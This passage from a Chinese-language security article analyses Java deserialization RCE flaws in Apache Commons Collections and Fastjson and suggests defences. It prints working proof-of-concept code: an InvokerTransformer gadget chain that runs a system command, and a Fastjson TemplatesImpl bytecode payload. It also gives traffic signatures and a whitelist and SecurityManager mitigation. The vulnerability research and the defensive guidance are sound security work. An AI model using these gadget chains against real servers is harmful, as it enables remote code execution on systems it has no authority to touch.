            socket.close();
**小结**
利用了 JtaTransactionManager 类中可以被控制的 readObject() 方法，从而构造恶意的被序列化类，其中利用
readObject() 会触发远程恶意类中的构造函数这一点，达到目的。
##### 6\. JAVA Apache-CommonsCollections 序列化RCE漏洞分析
Apache Commons Collections 序列化 RCE 漏洞问题主要出现在
org.apache.commons.collections.Transformer 接口上；在 Apache Commons Collections
中有一个 InvokerTransformer 类实现了 Transformer，主要作用是调用 Java
的反射机制(反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性，详细内容请参考：http://ifeve.com/java-reflection/) 来调用任意函数，只需要传入方法名、参数类型和参数，即可调用任意函数。TransformedMap
配合sun.reflect.annotation.AnnotationInvocationHandler 中的
readObject()，可以触发漏洞。我们先来看一下大概的逻辑：
我们先来看一下Poc：
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Map;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    public class test3 {
        public static Object Reverse_Payload() throws Exception {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Calculator.app" }) };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innermap = new HashMap();
            innermap.put("value", "value");
            Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
            //通过反射获得AnnotationInvocationHandler类对象
            Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            //通过反射获得cls的构造函数
            Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
            //这里需要设置Accessible为true，否则序列化失败
            ctor.setAccessible(true);
            //通过newInstance()方法实例化对象
            Object instance = ctor.newInstance(Retention.class, outmap);
            return instance;
        }
        public static void main(String[] args) throws Exception {
            GeneratePayload(Reverse_Payload(),"obj");
            payloadTest("obj");
        }
        public static void GeneratePayload(Object instance, String file)
                throws Exception {
            //将构造好的payload序列化后写入文件中
            File f = new File(file);
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
            out.writeObject(instance);
            out.flush();
            out.close();
        }
        public static void payloadTest(String file) throws Exception {
            //读取写入的payload，并进行反序列化
            ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
            in.readObject();
            in.close();
        }
    }
我们先来看一下 Transformer 接口，该接口仅定义了一个方法 transform(Object input)：
我们可以看到该方法的作用是：给定一个 Object 对象经过转换后也返回一个 Object，该 PoC
中利用的是三个实现类：`ChainedTransformer`，`ConstantTransformer`，`InvokerTransformer`
首先看 InvokerTransformer 类中的 transform() 方法：
可以看到该方法中采用了反射的方法进行函数调用，Input 参数为要进行反射的对象 iMethodName , iParamTypes
为调用的方法名称以及该方法的参数类型，iArgs 为对应方法的参数，这三个参数均为可控参数：
接下来我们看一下 ConstantTransformer 类的 transform() 方法：
该方法很简单，就是返回 iConstant 属性，该属性也为可控参数：
最后一个ChainedTransformer类很关键，我们先看一下它的构造函数：
我们可以看出它传入的是一个 Transformer 数组，接下来看一下它的 transform() 方法：
这里使用了 for 循环来调用 Transformer 数组的 transform() 方法，并且使用了 object 作为后一个调用transform()
方法的参数，结合 PoC 来看：
我们构造了一个 Transformer 数组 transformers ，第一个参数是 “new
ConstantTransformer(Runtime.class)” ，后续均为 InvokerTransformer 对象，最后用该
Transformer 数组实例化了 transformerChain 对象，如果该对象触发了 transform() 函数,那么 transformers
将在内一次展开触发各自的 transform() 方法，由于 InvokerTransformer 类的特性，可以通过反射触发漏洞。下图是触发后 debug
截图：
iTransformers[0] 是 ConstantTransformer 对象，返回的就是 Runtime.class 类对象，再此处 object
也就被赋值为 Runtime.class 类对象，传入 iTransformers[2].transform() 方法：
然后依次类推：
最后：
这里就会执行 “open /Applications/Calculator.app” 命令。
但是我们无法直接利用此问题，但假设存在漏洞的服务器存在反序列化接口，我们可以通过反序列化来达到目的。
可以看出，关键是需要构造包含命令的 ChainedTransformer 对象，然后需要触发 ChainedTransformer 对象的
transform() 方法，即可实现目的。在 TransformedMap 中的 checkSetValue() 方法中，我们发现：
该方法会触发 transform() 方法，那么我们的思路就比较清晰了，我们可以首先构造一个 Map 和一个能够执行代码的
ChainedTransformer ，以此生成一个 TransformedMap ，然后想办法去触发 Map 中的 MapEntry 产生修改（例如
setValue() 函数），即可触发我们构造的 Transformer ，因此也就有了 PoC 中的一下代码：
这里的 outmap 是已经构造好的 TransformedMap ，现在我们的目的是需要能让服务器端反序列化某对象时，触发 outmap 的
checkSetValue() 函数。
这时类 AnnotationInvocationHandler 登场了，这个类有一个成员变量 memberValues 是 Map 类型，如下所示：
AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数，如下所示：
因为 setValue() 函数最终会触发 checkSetValue() 函数：
因此我们只需要使用前面构造的 outmap 来构造 AnnotationInvocationHandler ，进行序列化，当触发 readObject()
反序列化的时候，就能实现命令执行：
接下来就只需要序列化该对象：
当反序列化该对象，触发 readObject() 方法，就会导致命令执行：
Server 端接收到恶意请求后的处理流程：
所以这里 POC 执行流程为
TransformedMap->AnnotationInvocationHandler.readObject()->setValue()->checkSetValue()
漏洞成功触发。如图：
该漏洞当时影响广泛，在当时可以直接攻击最新版 WebLogic 、 WebSphere 、 JBoss 、 Jenkins 、OpenNMS 这些大名鼎鼎的
Java 应用。
##### 7\. Fastjson 反序列化漏洞
该漏洞刚发出公告时笔者研究发现 Fastjson 可以通过 JSON.parseObject 来实例化任何带有 setter
方法的类，当也止步于此，因为笔者当时认为利用条件过于苛刻。不过后来网上有人披露了部分细节。利用`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类和
Fastjson 的 `smartMatch()` 方法，从而实现了代码执行。
    public class Poc {
        public static String readClass(String cls){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try {
                IOUtils.copy(new FileInputStream(new File(cls)), bos);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return Base64.encodeBase64String(bos.toByteArray());
        }
        public static void  test_autoTypeDeny() throws Exception {
            ParserConfig config = new ParserConfig();
            final String fileSeparator = System.getProperty("file.separator");
            final String evilClassPath = System.getProperty("user.dir") + "/target/classes/person/Test.class";
            String evilCode = readClass(evilClassPath);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b',\"_outputProperties\":{ }," +
                    "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
            System.out.println(text1);
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        }
        public static void main(String args[]){
            try {
                test_autoTypeDeny();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
详细分析请移步：http://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/
这里的利用方式和 Jackson 的反序列化漏洞非常相似：http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/
由此可见，两个看似安全的组件如果在同一系统中，也能会带来一定安全问题。
##### 8\. 其他 Java 反序列化漏洞
根据上面的三个漏洞的简要分析，我们不难发现，Java
反序列化漏洞产生的原因大多数是因为反序列化时没有进行校验，或者有些校验使用黑名单方式又被绕过，最终使得包含恶意代码的序列化对象在服务器端被反序列化执行。核心问题都不是反序列化，但都是因为反序列化导致了恶意代码被执行。
这里总结了一些近两年的 Java 反序列化漏洞：http://seclists.org/oss-sec/2017/q2/307?utm_source=dlvr.it&utm_medium=twitter
##### 9\. 总结
**如何发现 Java 反序列化漏洞**
  1. 从流量中发现序列化的痕迹，关键字：`ac ed 00 05`，`rO0AB`
  2. Java RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是`1099`端口
  3. 从源码入手，可以被序列化的类一定实现了`Serializable`接口
  4. 观察反序列化时的`readObject()`方法是否重写，重写中是否有设计不合理，可以被利用之处
从可控数据的反序列化或间接的反序列化接口入手，再在此基础上尝试构造序列化的对象。
ysoserial 是一款非常好用的 Java 反序列化漏洞检测工具，该工具通过多种机制构造 PoC
，并灵活的运用了反射机制和动态代理机制，值得学习和研究。
**如何防范**
有部分人使用反序列化时认为:
        FileInputStream fis=new FileInputStream("object");
        ObjectInputStream ois=new ObjectInputStream(fis);
        String obj2=(String)ois.readObject();
可以通过类似 "(String)" 这种方式来确保得到自己反序列化的对象，并可以保护自己不会受到反序列化漏洞的危害。然而这明显是一个很基础的错误，在通过
"(String)" 类似方法进行强制转换之前， readObject() 函数已经运行完毕，该发生的已经发生了。
以下是两种比较常用的防范反序列化安全问题的方法：
**1\. 类白名单校验**
在 ObjectInputStream 中 resolveClass 里只是进行了 class 是否能被 load ，自定义
ObjectInputStream , 重载 resolveClass 的方法，对 className 进行白名单校验
    public final class test extends ObjectInputStream{
        ...
        protected Class resolveClass(ObjectStreamClass desc)
                throws IOException, ClassNotFoundException{
             if(!desc.getName().equals("className")){
                throw new ClassNotFoundException(desc.getName()+" forbidden!");
            }
            returnsuper.resolveClass(desc);
        }
          ...
    }
**2\. 禁止 JVM 执行外部命令 Runtime.exec**
通过扩展 SecurityManager 可以实现:
（By hengyunabc）
    SecurityManager originalSecurityManager = System.getSecurityManager();
            if (originalSecurityManager == null) {
                // 创建自己的SecurityManager
                SecurityManager sm = new SecurityManager() {
                    private void check(Permission perm) {
                        // 禁止exec
                        if (perm instanceof java.io.FilePermission) {
                            String actions = perm.getActions();
                            if (actions != null && actions.contains("execute")) {
                                throw new SecurityException("execute denied!");
                            }
                        }
                        // 禁止设置新的SecurityManager，保护自己
                        if (perm instanceof java.lang.RuntimePermission) {
                            String name = perm.getName();
                            if (name != null && name.contains("setSecurityManager")) {
                                throw new SecurityException("System.setSecurityManager denied!");
                            }
                        }
                    }
                    @Override
                    public void checkPermission(Permission perm) {
                        check(perm);
                    }
                    @Override
                    public void checkPermission(Permission perm, Object context) {
                        check(perm);
                    }
                };
                System.setSecurityManager(sm);
            }
Java 反序列化大多存在复杂系统间相互调用，控制，或较为底层的服务应用间交互等应用场景上，因此接口本身可能就存在一定的安全隐患。Java
反序列化本身没有错，而是面对不安全的数据时，缺乏相应的防范，导致了一些安全问题。并且不容忽视的是，也许某些 Java 服务没有直接使用存在漏洞的 Java
库，但只要 Lib 中存在存在漏洞的 Java 库，依然可能会受到威胁。
随着 Json 数据交换格式的普及，直接应用在服务端的反序列化接口也随之减少，但今年陆续爆出的 Jackson 和 Fastjson 两大 Json
处理库的反序列化漏洞，也暴露出了一些问题。所以无论是 Java 开发者还是安全相关人员，对于 Java
反序列化的安全问题应该具备一定的防范意识，并着重注意传入数据的校验，服务器权限和相关日志的检查， API 权限控制，通过 HTTPS 加密传输数据等方面。
**参考**
1.[《What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application
Have in Common? This
Vulnerability》](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)By @breenmachine
2.[《Spring framework deserialization
RCE漏洞分析以及利用》](https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/)By
iswin
3.[《JAVA Apache-CommonsCollections
序列化漏洞分析以及漏洞高级利用》](https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/) By iswin
4.[《Lib之过？Java反序列化漏洞通用利用分析》](https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/)By
长亭科技
5.[《禁止JVM执行外部命令Runtime.exec》](http://blog.csdn.net/hengyunabc/article/details/49804577​)By
hengyunabc
附本文[PDF下载地址](https://pan.baidu.com/s/1i50y7q9)
* * *